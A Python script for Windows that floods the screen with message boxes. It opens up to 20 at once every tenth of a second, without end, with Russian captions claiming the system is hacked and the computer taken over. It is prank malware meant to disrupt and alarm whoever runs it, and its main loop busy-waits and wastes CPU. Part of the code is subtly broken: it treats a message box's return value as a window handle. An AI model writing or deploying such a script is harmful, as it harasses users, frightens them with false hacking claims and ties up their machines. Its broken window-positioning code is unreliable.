import ctypes
import threading
import random
import pyautogui
import time

MESSAGES = [
    "Ты попался! 😈",
    "Это не баг, это фича! 🐛",
    "Система взломана! 💻",
    "Твой компьютер теперь мой! 👾",
    "Попробуй выключить меня! 😏",
    "Ты никогда не остановишь это! 🚀",
    "Зачем ты это сделал? 🤔",
    "Это только начало... 🌪️",
    "Окна, окна, окна! 🪟",
    "Ты в ловушке! 🕸️",
]

TITLES = [
    "Внимание!",
    "Ошибка!",
    "Предупреждение!",
    "Системное уведомление",
    "Критическая ошибка",
    "Взлом системы",
    "Срочное сообщение",
    "Ты никогда не закроешь это!",
    "Окно-убийца!",
    "Бесконечные окна!",
]

ICON_TYPES = [0x10, 0x40, 0x30]

screen_width, screen_height = pyautogui.size()

stop_event = threading.Event()

DELAY_BETWEEN_WINDOWS = 0.1

MAX_THREADS = 20

active_threads = 0
thread_lock = threading.Lock()

def open_popup():
    global active_threads
    try:
        message = random.choice(MESSAGES)
        title = random.choice(TITLES)
        icon = random.choice(ICON_TYPES)
        
        x = random.randint(0, screen_width - 400)
        y = random.randint(0, screen_height - 300)
        
        width = random.randint(300, 800)
        height = random.randint(200, 600)
        
        hwnd = ctypes.windll.user32.MessageBoxW(0, message, title, icon)
        ctypes.windll.user32.SetWindowPos(hwnd, 0, x, y, width, height, 0x0001)
    finally:
        with thread_lock:
            active_threads -= 1

def start_popup_flood():
    global active_threads
    while not stop_event.is_set():
        with thread_lock:
            if active_threads < MAX_THREADS:
                popup_thread = threading.Thread(target=open_popup)
                popup_thread.daemon = True
                popup_thread.start()
                active_threads += 1
        
        time.sleep(DELAY_BETWEEN_WINDOWS)

def main():
    popup_flood_thread = threading.Thread(target=start_popup_flood)
    popup_flood_thread.daemon = True
    popup_flood_thread.start()

    while True:
        pass

if __name__ == '__main__':
    main()